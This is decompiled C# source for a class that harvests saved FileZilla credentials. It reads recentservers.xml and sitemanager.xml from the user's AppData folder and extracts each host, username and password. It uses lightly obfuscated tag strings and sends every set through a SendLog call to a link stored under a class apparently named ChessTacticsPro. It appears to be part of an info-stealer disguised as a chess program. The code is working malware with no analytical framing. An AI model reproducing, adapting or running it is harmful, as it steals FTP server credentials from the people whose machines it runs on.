using System;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x0200000C RID: 12
[StandardModule]
internal sealed class Filezilla
{
	// Token: 0x0600003F RID: 63 RVA: 0x000032F4 File Offset: 0x000022F4
	public static string FileZillaPass()
	{
		string text = Environment.NewLine + Environment.NewLine + "Program: FileZilla " + Environment.NewLine;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string str = null;
		string str2 = null;
		string path = Path.Combine(folderPath, "FileZilla\\recentservers.xml");
		string path2 = Path.Combine(folderPath, "FileZilla\\sitemanager.xml");
		if (File.Exists(path))
		{
			str = File.ReadAllText(path);
		}
		if (File.Exists(path2))
		{
			str2 = File.ReadAllText(path2);
		}
		return str + str2;
	}

	// Token: 0x06000040 RID: 64 RVA: 0x00003374 File Offset: 0x00002374
	public static void Recover()
	{
		string text = Filezilla.FileZillaPass();
		int i = 0;
		while (i < text.Length)
		{
			if (text.Length <= 0)
			{
				break;
			}
			if (!text.Contains("<Host>") | !text.Contains("<User>") | !text.Contains("<Pass>"))
			{
				break;
			}
			string host = Filezilla.midReturn("$<$H$os$t$>$".Replace("$", ""), "$<$/H$o$s$t$>$".Replace("$", ""), text);
			string username = Filezilla.midReturn("<User>", "</User>", text);
			string password = Filezilla.midReturn("$<P$as$s>$".Replace("$", ""), "$<$/$P$a$ss$>$".Replace("$", ""), text);
			Send.SendLog(ChessTacticsPro.P_Link, "Passwords", null, null, "Filezilla", host, username, password, null);
			text = text.Replace(text.Substring(0, checked(text.IndexOf("</Pass>") + 6)), null);
		}
	}

	// Token: 0x06000041 RID: 65 RVA: 0x0000348C File Offset: 0x0000248C
	public static string midReturn(string first, string last, string total)
	{
		string text = null;
		if (last.Length < 1)
		{
			text = total.Substring(total.IndexOf(first));
		}
		if (first.Length < 1)
		{
			text = total.Substring(0, total.IndexOf(last));
		}
		try
		{
			text = total.Substring(total.IndexOf(first), checked(total.IndexOf(last) - total.IndexOf(first))).Replace(first, "").Replace(last, "");
		}
		catch (Exception ex)
		{
		}
		text = text;
		return text;
	}
}
